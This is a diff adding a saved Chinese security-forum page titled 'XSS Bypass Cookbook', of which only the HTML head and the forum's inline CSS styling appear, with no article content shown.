@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<!-- saved from url=(0046)https://xianzhi.aliyun.com/forum/read/536.html -->
+<html xmlns:wb="//open.weibo.com/wb"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>【独家】XSS Bypass Cookbook|漏洞研究 - 安全技术社区</title>
+<meta name="description" content="XSS Bypass Cookbook[+] Author: math1as[+] Team: L team#1 引言在目前的web安全漏洞中,xss一直属于热门的一类,而它对用户造成的危害较大。因此也引发了不少安全爱好者和专业工程师的研究。而html5等新技术 ..|安全技术社区">
+
+<meta name="keywords" content="Web安全,【独家】XSS Bypass Cookbook|漏洞研究 - 安全技术社区">
+<meta name="mobile-agent" content="format=html5;url=https://xianzhi.aliyun.com/forum/mobile/read/536.html">
+
+<!--[if IE 9 ]>
+<meta name="msapplication-task" content="name=网站首页; action-uri=https://xianzhi.aliyun.com/forum; icon-uri=https://xianzhi.aliyun.com/forum/favicon.ico" />
+<meta name="msapplication-task" content="name=个人中心; action-uri=https://xianzhi.aliyun.com/forum/u.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/home.ico" />
+<meta name="msapplication-task" content="name=我的帖子; action-uri=https://xianzhi.aliyun.com/forum/apps.php?q=article; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/post.ico" />
+<meta name="msapplication-task" content="name=消息中心; action-uri=https://xianzhi.aliyun.com/forum/message.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/mail.ico" />
+<meta name="msapplication-task" content="name=我的设置; action-uri=https://xianzhi.aliyun.com/forum/profile.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/edit.ico" />
+<![endif]-->
+<link rel="archives" title="安全技术社区" href="https://xianzhi.aliyun.com/forum/simple/">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://xianzhi.aliyun.com/forum/rss.php?fid=4">
+<link rel="stylesheet" href="./XSS_Bypass_Cookbook_files/dpl.css">
+<!--<base id="headbase" href="https://xianzhi.aliyun.com/forum/">--><base href=".">
+<link rel="stylesheet" href="./XSS_Bypass_Cookbook_files/pw_core.css">
+<link rel="stylesheet" href="./XSS_Bypass_Cookbook_files/newstyle.css">
+
+<!--css-->
+<style type="text/css">
+/*Spacing*/
+.pdD{padding:.3em .5em}
+.pd5{padding:0 5px;}
+.pd15{padding:0 15px;}
+/*form*/
+input.btn,input.bt{cursor:pointer;padding:.1em 1em;*padding:0 1em;font-size:9pt; line-height:130%; overflow:visible;}
+input.btn{border:1px solid #ff5500;background:#ff8800;margin:0 3px;color:#fff;}
+input.bt{border:1px solid #c2d8ee;background:#fff;margin:0 3px;color:#333;}
+/*layout*/
+html{/*background-color:#fff;*/overflow-y:scroll;background:#fff;}
+body{font-size:12px;font-family:Arial; color:#333;line-height: 1.5;;min-height:500px;}
+.wrap,#top{min-width:820px;margin:auto;}
+/*全局链接*/
+a{text-decoration:none;color:#333333;}
+a:hover,.alink a,.link{text-decoration:underline;}
+/*链接按钮*/
+.bta{cursor:pointer;color:#333333;padding:0 5px;margin:0 3px;white-space:nowrap;border:1px solid #d5e6ed;line-height:22px;background:#ffffff;}
+.bta:hover{border:1px solid #a6cbe7;text-decoration:none;}
+/*main color 数值自定义*/
+.f_one,.t_one,.r_one{background:#ffffff;}
+.f_two,.t_two,.r_two{background:#f3f9fb;}
+/*头部*/
+#head,.main-wrap,#footer,#navA,.top{width:960px;margin:0 auto;max-width:1200px;}
+#head,.main-wrap,#footer,#navA,.top{width:980px}
+
+#search_wrap{background:#ddd;}
+
+/*aliyun_topbar*/
+.aliyun-topbar a, .aliyun-footer a{text-decoration:none;}
+.aliyun-topbar a:hover,  .aliyun-footer a:hover{ text-decoration:underline;}
+.aliyun-topbar{height:30px; background:#fafafa; border-bottom:1px solid #e9e9e9;}
+.aliyun-topbar a:hover{text-decoration:underline;}
+.aliyun-topbar-wrap{width:950px;height:30px;margin:0 auto;}
+.aliyun-topbar-wrap .menu-link{position:relative;z-index:9999;float:left;display:inline;height:30px;}
+.aliyun-topbar-wrap .menu-link .link-site{float:left;line-height:30px;}
+.aliyun-topbar-wrap .menu-link .link-site a{padding-right:10px;color:#666;}
+
+.aliyun-topbar-wrap .menu-link .menu-wrap{position:relative;z-index:9999;float:left;}
+.aliyun-topbar-wrap .menu-link .site-menu{position:relative;z-index:9998;float:left;display:inline;height:18;margin:7px 1px 0 1px;padding:0 16px 0 7px;color:#666; cursor:default;-moz-border-radius-topleft:5px;-moz-border-radius-topright:5px;-webkit-border-top-left-radius:5px;-webkit-border-top-right-radius:5px;border-top-left-radius:5px;border-top-right-radius:5px;}
+.aliyun-topbar-wrap .menu-link .hover .site-menu{border:#999 solid;border-width:1px 1px 0 1px;background:#fff;margin:6px 0 -1px 0;color:#9f9f9f;}
+.aliyun-topbar-wrap .menu-link .corner{position:absolute;z-index:9998;right:6px;top:14px;width:0;height:0;border:4px solid;overflow:hidden;border-color:#666 #f4f4f4 #f4f4f4 #f4f4f4;-moz-transition:-moz-transform 0.3s ease-in;-webkit-transition:-webkit-transform 0.3s ease-in;-o-transition:-o-transform 0.3s ease-in;}
+.aliyun-topbar-wrap .menu-link .hover .corner{border-color:#9e9e9e #fff #fff #fff;-moz-transform:rotate(180deg);-moz-transform-origin:50% 30%;-webkit-transform:rotate(180deg);-webkit-transform-origin:50% 30%;-o-transform:rotate(180deg);-o-transform-origin:50% 30%;}
+
+.aliyun-topbar-wrap .menu-link .menu-list{display:none;position:absolute;z-index:9997;left:0px;top:24px;width:65px;border:1px solid #999;background:#fff; text-align: left;padding:5px 0 5px 7px;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;-moz-border-radius-topleft:0;-webkit-border-top-left-radius:0;border-top-left-radius:0;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item{float:left;padding:0 0 0 0;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dl{}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dt{color:#575757;font-weight:700;padding-bottom:2px;border-bottom:1px solid #cfcfcf;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd{padding:3px 0 5px;line-height:22px;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd a{color:#666;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd a:hover{color:#f49c0f;}
+
+.aliyun-topbar-wrap .login-info{float:right;display:inline;color:#666;line-height:30px;}
+.aliyun-topbar-wrap .login-info .division{color:#aaa;}
+.aliyun-topbar-wrap .login-info .user-id{color:#f89727; font-weight:700;}
+.aliyun-topbar-wrap .login-info a{color:#666;}
+.aliyun-topbar-wrap .login-info .login-link a{color:#666;margin:0 7px;}
+.aliyun-topbar-wrap .login-info a.link-reg{margin-left:15px;}
+.aliyun-topbar-wrap .login-info a.link-login-out{margin-left:10px;}
+.aliyun-topbar-wrap .login-info a.link-console{margin-left:15px;}
+.aliyun-topbar-wrap .login-info .login-link em{color:#f00;}
+
+	/*导航*/
+	.aliyun_menu{ float:right;}
+	.aliyun_menu li{float:left; padding:0 12px; border-right:1px solid #d5d5d5; height:12px; line-height:14px; }
+/*	
+.nav_wrap{background:url(images/wind85/navbg.png) repeat-x 0 0; height:44px;}	
+*/
+.nav_wrap{background:#f3f3f3;border-bottom: 1px solid #d9d9d9;height:80px}
+.nav_wrap .l-logo{float:left;width:62px;height:62px;background:url(images/wind85/ltlogo.png) repeat-x 0 0;margin:10px 0 0}
+.nav_wrap .l-logo a{text-indent:-9999em;float:left;display:inline-block;width:62px;height:62px;cursor:pointer;}
+/*
+#navA{height:44px;}
+.navA{height:44px;overflow:hidden;}
+*/
+	/*搜索*/
+	#searchA{margin:28px 0 0 25px;height:42px;overflow:hidden;}
+	.searchA{padding:3px 0 0 0;}
+	.searchA .ip{width:360px;float:left;border:1px solid #dddddd;background:#fff url(images/wind85/searchA.png) no-repeat 3px 5px;height:22px;padding:4px 5px 4px 25px;overflow:hidden;}
+	.searchA .ip input{border:0;background:none;padding:0;font:14px/22px Arial;width:100%;float:left;margin:0; height:22px;}
+	.s_select{float:left;border:1px solid #dddddd;border-left:0;margin-right:5px;background:#fff;width:49px;}
+	.s_select h6{display:block;padding:0 15px 0 10px;height:30px;line-height:30px;cursor:pointer;background:url(images/wind85/down.png) 35px center no-repeat;color:#666;}
+	.s_select ul{ position:absolute;border:1px solid #dddddd;background:#fff;line-height:22px;width:49px;margin:24px 0 0 -1px;display:none;}
+	.s_select ul li{padding:0 10px;cursor:pointer;}
+	.s_select ul li:hover{background:#f7f7f7;}
+	.searchA button{width:60px;height:31px;font-size:12px; font-weight:700; color:#fff;line-height:31px;padding:0;}
+
+	/*站点信息*/
+	#infobox{margin-bottom:5px;}
+	#infobox .fr li,#breadCrumb .fr li{float:left;padding:0 5px;}
+	#infobox .fr li a,#breadCrumb .fr li a{float:left;}
+	/*快捷导航*/
+#td_mymenu{background:#d9d9d9 url(images/wind85/fastarrow.png) 90px 12px no-repeat;color:#666;cursor:pointer;float:right;width:96px;height:28px;/*overflow:hidden;*/line-height:28px;padding-left:10px;margin:30px 0 0 0;
+-webkit-border-radius: 3px;-moz-border-radius: 3px;-ms-border-radius: 3px;
+-o-border-radius: 3px;border-radius: 3px;
+}
+#td_mymenu_old{color:#888;}
+	/*面包屑*/
+	#breadCrumb{zoom:1; border-bottom:1px solid #e7e7e7;background:#ffffff;margin-bottom:10px;}
+	#breadCrumb a{line-height:30px;}
+	#breadCrumb .fr{padding-top:7px;}
+	#breadCrumb .fr a{line-height:18px;}
+	#breadCrumb em{ font-family:Simsun;margin:0 5px;}
+	#breadCrumb .breadEm{height:30px;background:url(images/wind85/breadEm.png) 0 0 no-repeat;width:10px;overflow:hidden;margin:0 3px;float:left;}
+	#breadCrumb img.breadHome{float:left;margin:6px 5px 0 0;}
+	/*站点信息*/
+	.pw_ulC{margin:15px 0 0;padding-left:5px;}
+	.pw_ulC li{float:left;border-right:1px solid #ffce80;padding:0 5px; color:#fff; height:12px; line-height:12px;}
+	.pw_ulC li em{color:#fff; font-family:Arial;-webkit-transition: all 0.2s ease-out;-o-transition: all 0.2s ease-out;}
+	.pw_ulC li em a{color:#fff;}
+	.pw_ulC li:hover em{-webkit-transform: scale(1.5);-o-transform: scale(1.5);}
+	.pw_ulC li.none{border:0;}
+	/*文字广告*/
+	.textMes{margin:0 auto 5px;border:1px solid #d5e6ed;border-bottom:0;background:#ffffff;}
+	.textMes .tr3 td,.textMes .tr3 th{border-bottom:1px solid #d5e6ed;padding:.4em .6em;border-top:0;}
+/*中间内容*/
+.main-wrap{margin-bottom:10px;}
+#pw_content{}
+.t{border:1px solid #e5e5e5;padding:1px;_display:inline-block;margin-bottom:10px;background:#ffffff;}
+.tTable{border:1px solid #e8e8e8;}
+.tTable table{ border:3px solid #fff;background:#fff}
+.tTable2{border:1px solid #e8e8e8;border-right:none}
+.tTable2 table{ border:1px solid #fff; background:#f8f8f8;}
+.tTable2 table th{padding:20px 0 20px 20px; text-align:center;border-right:1px solid #e8e8e8}
+.tTable2_ul{clear:left; padding-top:10px; display:none}
+.tTable2_ul li{ color:#999; height:24px; line-height:24px; overflow:hidden;}
+.tTable2_ul li a{ color:#666;}
+.tTable2_ul li span a{ color:#999;}
+#pw_content .t{border:0;padding:0;}
+.bk_desc{float:right;width:240px}
+	/*首页热榜*/
+	.newInfor h4{font-weight:700;overflow:hidden;color:#666;padding:0 0 0 10px;margin-bottom:10px;}
+	.newInfor .switchItem .view-hover,.newInfor .switchItem .view-current{min-height:195px;_height:195px;}
+	.newflash{width:650px;height:225px;overflow:hidden;}
+		.flashimg p a{color:#fff;font-weight:700;text-shadow:1px 1px 0px #333;}
+		.flashimg img{display:inline-block;width:650px;height:225px;}
+		/*
+	.flashimg p{overflow:hidden;width:260px;bottom:4px;position:absolute;text-indent:12px;z-index:2;left:0; display:none}
+	.flashBg{ position:absolute;bottom:0;width:100%;height:27px;background:#000;filter:alpha(opacity=60);-moz-opacity:0.6;opacity:0.6; z-index:1; display:none}
+	*/
+	.an{ position:absolute;right:5px;z-index:2;bottom:5px;}
+	.an li{float:left;margin-left:5px;}
+	.an li a{float:left;background:#fff;overflow:hidden;width:7px;height:7px;-webkit-transition: all 0.2s ease-out;-o-transition: all 0.2s ease-out; text-indent:-9999em}
+	.an li.current a,.an li a:hover{background:#00a2ca;}
+	.an li a:hover{-webkit-transform: scale(1.4);-o-transform: scale(1.4);}
+	.newHotA dd{padding:5px 0 10px;}
+	.newHotA{width:500px;}
+	.newHotB{}
+	.newHotB li{float:left;width:47.5%;padding-right:2%;line-height:22px;height:22px;overflow:hidden;}
+	.newHotB a{color:#004b91;}
+	.newHotB em a{color:#333;}
+	/*公告*/
+	.noticebg{border-top:1px dotted #ccc;margin:0 10px;}
+	#notice{padding:5px 5px 5px 5px;background:url(images/wind85/file/anc.gif) 2px 5px no-repeat;}
+	#notice li{list-style:none;float:left;white-space:nowrap;padding-left:20px;height:18px;}
+	#notice a{padding-right:.5em;}
+	#notice0{width:98%;height:18px;line-height:18px;overflow-y:hidden;}
+	/*通用标题栏*/
+	.h{color:#1b72af;padding:5px 0;overflow:hidden;font-family:'Microsoft Yahei'}
+	.h a{color:#1b72af}
+	.h span a,.h span{color:#5ea6d8;}
+	.h a span{ font-family:Verdana;}
+	.closeicon{height:16px;}
+	.cate_fold{padding:0 5px 0 5px;text-decoration:none;}
+	.cate_fold:hover{text-decoration:none;}
+	/*内容区域顶部标题栏*/
+	.hB{height:32px;line-height:32px;overflow:hidden;}
+		/*标题栏内tab切换*/
+		.tabB{margin-top:3px;height:32px;padding-left:10px;}
+		.tabB li{float:left;}
+		.tabB li a{color:#014c90; font-weight:100;padding:0 15px;float:left;line-height:25px;height:27px;padding-top:2px;}
+		.tabB li.current a{border:1px solid #dcdcdc;border-bottom:0;background:#ffffff;color:#333;padding-top:1px;}
+		.tabB li a:hover{ text-decoration:none;}
+	.content_thread .content_ie h3{font-size:18px}
+	/*h2版块名，h3分类版块名*/
+	h2{font-weight:200;font-family:'Microsoft Yahei'; font-size:16px; }
+	h2 a{color:#333;}
+	h3{font-weight:700;display:inline;}
+	h3 a{color:#333333; font-size:14px; font-weight:400;}
+	h3 a:hover{ text-decoration:none;color:#ff5500;}
+	/*table表格*/
+	.tr3 td,.tr3 th{border-bottom:1px solid #efefef;}
+	.tr3none th,.tr3none td{border-bottom:none;}
+	.tr3 .old,.tr3 .new,.tr3 .lock{padding:10px 5px 10px 45px;color:#444;font-weight:100;height:35px;}
+	.tr3 .old{background:url(images/wind85/old.gif) 0 15px no-repeat;}/*旧主题版块*/
+	.tr3 .new{background:url(images/wind85/new.gif) 0 15px no-repeat;}/*新主题版块*/
+	.tr3 .lock{background:url(images/wind85/lock.gif) 0 15px no-repeat;}/*锁定版块*/
+	.tr2 td,.tr2 th{padding:3px 5px;color:#666;background:#f7fbff;border-bottom:1px dotted #d5e6ed;}
+	.tr2 th,.tr3 th{font-weight:100;}
+	.tr3 td{padding:5px 10px;}
+	.tr3 th{padding:15px;vertical-align:top;}
+	td.num{color:#444; font-size:11px;-webkit-text-size-adjust:none;}
+	td.num em{color:#014c90;}
+	.re{width:220px;}
+	.author{width:105px;}
+	.author a{color:#444;}
+	.author p,.author p a{color:#999;font-size:11px;-webkit-text-size-adjust:none;}
+	.author p span{ font-family:Verdana;}
+	.view,.fNum,.fNum a,.adminlist a,.adminlist{color:#666;}
+	.tr3 td.icon{padding:10px 0;}
+	.icon div.tips{position:absolute;margin-left:-45px;background:#ffffcc;border:1px solid #cc6699;padding:3px 10px;}
+	.adminbox{padding:0 0 0 10px;width:25px;}
+	.tr3 td.subject{padding:5px 10px 5px 0;}
+	.tr4 td{padding:3px 5px;border-bottom:1px solid #eaeaea;color:#666;background:#f9f9f9;}
+	.tr4 td a{color:#6a99bf}
+	.tr4 td .current{color:#333;}
+	.z tr:hover td,.z tr:hover th{background-color:#fbfbfb;}
+	.bt0 td{border-top:0;}
+	.tr5 td{border:0;}
+	.threadCommon .tr3 td{line-height:1.3;}/*列表行高*/
+	.hrA{height:1px; background:#d5e6ed;color:#d5e6ed;border:0;margin:8px 0;overflow:hidden;}
+	/*old table*/
+	.t3 td{padding:2px 5px;}
+	/*发帖回复*/
+	.post,.replay{height:30px;overflow:hidden;text-align:center;font:bold 14px/30px Simsun;}
+	.replay{ background:#f90;color:#fff;-webkit-border-radius: 4px;-moz-border-radius: 4px;
+-ms-border-radius: 4px;-o-border-radius: 4px;border-radius: 4px;}
+.post:hover,.replay:hover{text-decoration:none;color:#fff}
+
+	.post:hover{color:#fff;}
+	/*列表页分类*/
+	.pw_ulA{height:auto;margin:15px 0;}
+	.pw_ulA li{float:left;border-right:1px solid #ccc;}
+	.pw_ulA li a{line-height:14px;height:14px;padding:0 10px;float:left;color:#000;font-weight:100; white-space:nowrap;}
+	.pw_ulA li a:hover{ text-decoration:none;}
+	.pw_ulA a span{ font-size:10px;}
+	.pw_ulA li.current a{color:#333; font-weight:700;}
+	/*版主推荐,群组列表*/
+	.pw_ulB{padding:10px 0 10px 10px;background-color:#F7F7F7;border-bottom:1px solid #e5e5e5;border-top:1px solid #e5e5e5;}
+	.pw_ulB li{line-height:22px;height:22px;overflow:hidden;}
+	.pw_ulB li a{width:330px;padding-left:13px;background: url(images/dot.gif) 0 3px no-repeat;}
+	.pw_ulB li em a{padding:0;background:none;}
+	.pw_ulB .adel{margin:4px 40px 0 0 ;}
+	.pw_ulB .one{float:left;width:90px;margin:0 15px 0 0;}
+	.pw_ulB .one p,.pw_ulB .two p{text-align:center;height:22px;overflow:hidden;}
+	.pw_ulB .two{float:left;width:90px;margin:0 15px 10px 0;height:120px;}
+	.pw_ulB .two a{padding-left:0;background:none;}
+	/*侧栏版块列表*/
+	.pw_ulD{padding:5px;}
+	.pw_ulD li{padding:0 5px;}
+	.pw_ulD li:hover,.pw_ulD li.hover,.pw_ulD li.current{background:#daeef9;}
+	.pw_ulD li a{line-height:22px;height:22px;overflow:hidden;}
+	.pw_ulD li a:hover{ text-decoration:none;}
+	.pw_ulD li del{margin-top:3px;display:none;}
+	.pw_ulD li:hover del,.pw_ulD li.current del,.pw_ulD li.hover del{display:block;}
+	.sideForum {}
+	.sideForum .pw_ulD{border-top:1px solid #cfdfec;}
+	.sideForum .pw_ulD li.current{background:#2e84c1;}
+	.sideForum .pw_ulD li.current a{color:#fff;display:block;}
+	.sideForum dt{line-height:29px;height:29px;padding:0 10px; background:url(images/wind85/thread/sideForumDt.gif) right 0;cursor:pointer;overflow:hidden;}
+	.sideForum dd{display:none;}
+	.sideForum .one dt{background-position:right -30px; font-weight:700;}
+	.sideForum .one dd{display:block;}
+	/*列表侧栏*/
+	.sidebar{float:left;overflow:hidden;margin-right:-1px;margin-bottom:-1px;}
+	.content_thread{background:#ffffff;min-height:600px;_height:600px;_float:right;}
+	.sideClose .content_thread{margin:0;border:0;float:none;}
+	.f_tree{background:#f7faff;}
+	.fastpost .floot_left{display:none;_width:0;_border:0;}
+	/*列表操作图标*/
+	.keep,.keepOn{background:url(images/sideicon-new.gif) 9999px 9999px no-repeat;cursor:pointer;}
+	.history,.pw_ulD del,.switch,.rss,.competence{background:url(images/sprite.png) 9999px 9999px no-repeat;cursor:pointer;}
+	.history,.pw_ulD del{float:right;width:16px;height:16px;overflow:hidden;display:block;text-indent:-2000em;}
+	.history{ background-position:0 0;}
+	.switch{float:left;width:9px;height:27px;display:block; text-indent:-2000em;overflow:hidden; background-position:0 -40px;margin-top:1px; position:absolute;}
+	.switch:hover{ background-position:-9px -40px;}
+	.sideClose .switch{background-position:-1px -68px;width:8px;}
+	.sideClose .switch:hover{background-position:-10px -68px;}
+	.pw_ulD del{ background-position:0 -20px;}
+	.pw_ulD del:hover{ background-position:-20px -20px;}
+	.keep,.keepOn,.rss,.competence{float:left;padding-left:22px;background-position:-120px 0;line-height:20px;*line-height:20px;height:20px;margin-top:6px;}
+	.keep{background-position:-120px 1px;}
+	.keep:hover{background-position:-120px -19px;}
+	.keepOn{background-position:-120px -39px;}
+	.rss{background-position:0 -680px;}
+	.competence{background-position:0 -650px;}
+	/*侧栏收藏的版块*/
+	.myForum h6{color:#666;padding:6px 10px 5px;}
+	.myForum .pw_ulD li{height:22px;overflow:hidden;}
+	/*列表帖子类型tab*/
+	.tabA{border-bottom:1px solid #e5e5e5;height:28px;padding:10px 10px 10px 0;}
+	.tabA ul{_position:absolute;font-size:14px;overflow:hidden;background:#fff;}
+	.tabA li{float:left;margin-left:-1px;margin-top:5px;}
+	.tabA li a{float:left;color:#00a2ca;line-height:1.2;padding:0 15px;overflow:hidden;border:none;padding:0 10px;font-size:12px;}
+	.tabA li a:hover{ text-decoration:none;color:#333;}
+	.tabA li.current{margin:0;margin-right:6px;}
+	.tabA li.current a{
+		color: #fff;
+		font-weight: 700;
+		background: #00a2ca;
+		-webkit-border-radius: 3px;
+		-moz-border-radius: 3px;
+		border-radius: 3px;
+		line-height:24px;}
+	/*帖子列表管理操作*/
+	.manageCheck{border-bottom:1px solid #c6d9e7;border-top:1px solid #c6d9e7;background:#f2f7fa;padding:5px 7px;margin-top:-1px;}
+	/*帖子楼层结构*/
+	.floot{ table-layout:fixed;}
+	.floot_left{width:160px;background:#fbfbfb;border-right:1px solid #efefef; vertical-align:top;}
+	.floot_leftdiv{padding:10px 10px 50px 15px;}
+	.floot_right{background:#ffffff;padding:10px 20px 0;vertical-align:top;}
+	.floot_bottom{vertical-align:bottom;padding:0 20px;background:#fff}
+	.readTop{background:#f3fdff;}
+	/*楼层间*/
+	.flootbg{background:#d4e6ed;height:3px;border-top:1px solid #fff;border-bottom:1px solid #fff;}
+	/*帖子信息*/
+	.tipTop{padding:0 0 10px;border-bottom:1px dotted #ccc;margin-bottom:10px;}
+	/*印戳*/
+	.overprint{overflow:hidden;position:absolute;margin-left:440px;margin-top:-35px;}
+	.overprint_opl {height:200px;overflow:auto;}
+	.overprint_opl a{display:block;float:left;padding:3px;margin:3px}
+	.overprint_opl a.current{border:1px solid #ccc;padding:2px}
+	.overprint_opl a:hover{border:1px solid #ddd;padding:2px;background:#fff9f0}
+	/*帖子用户信息*/
+	.honor{color:#777;overflow:hidden;line-height:1.3;}
+	.user-infoWrap2 li{line-height:20px;height:20px;overflow:hidden;}
+	.user-infoWrap2 li em{float:left;width:60px;}
+	.user-pic{margin-left:-2px;}
+	.face_img img{padding:3px;border:1px solid #d5e6ed;background:#ffffff;}
+	/*帖子操作*/
+	.tipBottom{padding:10px 0;border-top:1px dotted #ccc;margin-top:10px;}
+	.readbot a{list-style:none;padding:0 0 0 1.5em;margin:0;float:left;cursor:pointer;background:url(images/post-icon.png) no-repeat;width:3.5em;height:16px;}
+	.readbot .r-quote {background-position:0 -348px;}
+	.readbot .r-reply {background-position:0 -287px;}
+	.readbot .r-score {background-position:0 -319px;}
+	.readbot .r-keep {background-position:0 -140px;}
+	.readbot .r-recommend {background-position:0 -180px;}
+	.readbot .r-report {background-position:0 -220px;}
+	/*帖子标题*/
+	h1.read_h1{padding:0 20px;}
+	.read_h1,.read_h1 a{font-size:16px;color:#333333; font-weight:700;line-height:1.2;padding:0;margin:0;}
+	/*帖子内容区域*/
+	blockquote{margin-left:12px;}
+	.tpc_content{font-family:Arial;padding:0 2px 20px;margin:0;line-height:1.8em;}
+	.tpc_content font{line-height:1.5em;}
+	.tpc_content a{text-decoration:none;color:#0070AF;}
+	.tpc_content a:hover{text-decoration:underline}
+	.tpc_content ol{list-style-type:decimal;}
+	.tpc_content ul{list-style-type:disc;}
+	.blockquote{zoom:1;padding:5px 8px 5px;line-height:1.3;background:#fffae1;margin:0 0 10px 0;}
+	.tips{border:1px solid #a6cbe7;background:#f3f9fb;padding:3px 10px;display:inline-block;_float:left;}
+	/*帖子代码*/
+	.blockquote2{border: 1px solid; border-color: #c0c0c0 #ededed #ededed #c0c0c0;margin:0px;padding:0 0 0 2em;line-height:2em;overflow:hidden;background:#ffffff;margin-left:0;}
+	.blockquote2 ol{margin:0 0 0 1.5em;padding:0;}
+	.blockquote2 ol li{border-left:1px solid #ccc;background:#f7f7f7;padding-left:10px;font-size:12px;font-family:"Courier New" serif;list-style-type:decimal-leading-zero;padding-right:1em;}
+	.blockquote2 ol li:hover{background:#ffffff;color:#008ef1;}
+	.blockquote2 ol li{list-style-type:decimal;}
+	/*帖子引用*/
+	.blockquote3{clear:left;border:1px dashed #CCC;background:#f7f7f7 url(images/blockquote3.png) right top no-repeat;padding:5px 10px;margin-left:0;}
+	.blockquote3 .quote{color:#999;font-size:12px;}
+	.blockquote3 .text{padding:0 10px 10px 10px;}
+	/*帖子表格*/
+	.read_form{border-top:1px solid #d5e6ed;border-left:1px solid #d5e6ed;}
+	.read_form td{height:20px;padding:0 5px;border-right:1px solid #d5e6ed;border-bottom:1px solid #d5e6ed;}
+	/*分割线*/
+	.sigline {background: url(images/wind85/read/sigline.gif) left bottom no-repeat;height:16px;}
+	/*帖子签名*/
+	.signature {padding:10px 0 0 0;height:expression(this.scrollHeight>parseInt(this.currentStyle.maxHeight)?this.currentStyle.maxHeight:"auto");}
+	/*下载*/
+	.down {background:url(images/post/down.gif) 5px center no-repeat;padding:5px 5px 5px 30px;border:#d5e6ed 1px solid;margin:0 1em 0 0;line-height:40px;}
+	/*分类信息*/
+	.cates{margin:0 0 10px;border-top:1px solid #e4e4e4; font-size:12px;}
+	.cates .cate-list li{line-height:28px;font-weight:500;color:#444444; list-style:none;border-bottom:1px solid #e4e4e4;padding-left:110px;}
+	.cates .cate-list em{ font-style:normal;width:100px;float:left; text-align:right; font-weight:700;margin-left:-110px;}
+	.cates .cate-list cite{font-style:normal;}
+	.cates input{ vertical-align:middle;}
+	.cates .w{margin-right:10px;}
+	.cates .two{background:#f7f7f7;}
+	.cate_meg_player {float:right;width:200px;padding:0 10px 9px 0;background:#ffffff;}
+	/*帖子页flash*/
+	.readFlash{position:relative;height:180px;overflow:hidden;text-align:center;}
+	.readFlash img{width:100%;}
+	.readFlash ul {position:absolute;right:8px;bottom:8px;z-index:3;}
+	.readFlash ul li {list-style:none;float:left;width:18px;height:13px;line-height:13px;text-align:center;margin-left:2px;background:#ffffff;}
+	.readFlash ul li a {display:block;width:18px;height:13px;font-size:10px;font-family:Tahoma;color:#333333;}
+	.readFlash ul li a:hover,.flash ul li a.sel {color:#fff;text-decoration:none;background:#ffa900;}
+
+	/*评分*/
+	.score{}
+	.score td,.score th{
+		padding: 5px;
+		text-align: left;
+		border-bottom: 1px solid #efefef;
+		color:#666;
+	}
+
+	
+	.scoreTop{position: relative;
+	padding: 5px;
+	margin-bottom: 10px;
+	text-align: left;
+	background: #f4f4f4;
+	border-bottom: 1px solid #e5e5e5;}
+
+	.scoreContent{margin:5px 10px;}
+	.scoreContent .adel{margin-top:5px;}
+	.scoreBottom{border-top:1px solid #a5cae5;padding:3px 13px;background:#f3f8fb;}
+
+	.score a{color:#00a2ca;}
+
+	.scoreContent .current td{padding:0;}
+
+	.p_face{width:35px;}
+	.p_name{width:100px;}
+	/*友情链接*/
+	.sharelink{border-bottom:1px dotted #ddd;padding:5px 0;word-break: keep-all;}
+	.sharelink dt{padding-top:3px;}
+	.sharelink dd a{color:#369;}
+	.sharelink2{padding:5px 0;}
+	.sharelink2 a{margin-right:10px; white-space:nowrap;float:left;}
+	.sharelink2 img{margin-right:10px;}
+	/*生日会员*/
+	.brithcache span{float:left;width:100px;line-height:22px;height:22px;overflow:hidden;}
+/*底部*/
+.aliyun-footer{width:980px;height:18px;margin:30px auto 0 auto;color:#666;padding:20px 0 20px 0;background:url(images/wind_aliyun/aliyun_footer_line.png) no-repeat center 0;}
+.aliyun-footer .footer-link{float:left;color:#aaa;}
+.aliyun-footer .footer-info{float:right;}
+.aliyun-footer a{color:#666;margin:0 7px;}
+
+#footer{padding:0 0 10px;}
+#footer a{color:#68b}
+.bottom{margin:0 auto;}
+.bottom ul{ padding:0 5px 5px;margin:0; list-style:none;}
+.bottom ul li{ padding:0 10px 0 0;display:inline;}
+.bottom ul li a{white-space:nowrap;}
+/*css3.0*/
+.history,del,.keep{-webkit-transition: all 0.2s ease-out;transition: all 0.2s ease-out;}
+
+/*menu*/
+.menu{position:absolute;background:#ffffff;border:1px solid #d5e6ed;}
+.menu a{display:block;padding:4px 8px;}
+/*下拉框*/
+.menu-post{border:1px solid #a6cbe7;}
+.menu-post .menu-b{background:#ffffff;border:3px solid #d5e6ed;}
+.menu_tasksA .menu-b{border-width:8px;}
+/*通用下拉外框*/
+.pw_menu{border:1px solid #a6cbe7;background:#ffffff;/*-webkit-box-shadow:2px 2px 2px #bbb;*/;}
+.pw_menuBg{padding:0 10px 10px;}
+.pw_menu h6{ position:absolute;margin-top:-18px;height:17px;border:1px solid #a6cbe7;background:#ffffff;border-bottom:0;right:-1px;padding:0 4px;*padding:0 5px;line-height:18px;}
+/*下拉列表*/
+.menuList{background:#ffffff;}
+.menuList a:hover{background:#fbfbfb;}
+/*双列下拉*/
+.menuHalf{margin-right:-1px;padding:5px 0;}
+.menuHalf li{float:left;width:50%;border-right:1px dashed #d5e6ed;margin-right:-1px;}
+ul#post_typeChoose a{padding:0;}
+/*注册结构*/
+.regTitle{border-bottom:1px dotted #a2a2a2;padding:0 5px;margin-bottom:40px;}
+.regTitle h5{font-size:16px; font-weight:700;color:#9a9a9a;padding:10px 0 15px 45px;background:url(images/register/regtitle.png) 5px 0 no-repeat;}
+.regTitle .fr{margin-top:20px;}
+.regForm{width:750px;margin:auto;}
+.regForm dl{min-height:43px;_height:43px;}
+.regForm dt{float:left;width:100px;text-align:right;margin-right:15px;line-height:28px;font-size:14px;}
+.regForm dd{float:left;}
+.regForm .ip{width:230px;margin-right:1px;}
